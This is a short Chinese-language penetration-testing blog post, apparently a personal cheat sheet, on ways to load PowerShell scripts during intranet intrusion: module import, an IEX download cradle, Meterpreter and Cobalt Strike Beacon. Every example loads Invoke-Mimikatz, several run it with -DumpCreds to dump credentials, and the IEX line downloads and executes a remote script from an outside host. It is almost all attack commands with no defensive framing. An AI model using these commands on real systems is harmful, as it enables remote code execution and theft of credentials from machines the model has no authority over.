---
title: "加载 PowerShell 脚本"
date: 2019-07-24T00:00:00+08:00
draft: false
tags: ['powershell','metasploit','cobalt strike']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

通过 Module, IEX, Metasploit, Cobalt Strike 方式加载 PowerShell 脚本

<!--more-->

## Module

通过导入模块的方式加载 PowerShell 脚本.

```
Import-Module .\Invoke-Mimikatz.ps1
```

```
. .\Invoke-Mimikatz.ps1
```

## IEX

通过 `Invoke-Expression` 命令从网络加载 PowerShell 脚本.

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1')
```

## Metasploit

通过 Meterpreter 中的 powershell 模块加载 PowerShell 脚本.

```
load powershell
powershell_import /home/exp10it/Invoke-Mimikatz.ps1
powershell_execute Invoke-Mimikatz -DumpCreds
```

## Cobalt Strike

通过 Beacon 命令控制台加载 PowerShell 脚本.

```
powershell-import /home/exp10it/Invoke-Mimikatz.ps1
powershell-execute Invoke-Mimikatz -DumpCreds
```

## 注意

PowerShell 默认限制输出长度, 需手动更改.

```
$FormatEnumerationLimit = -1
```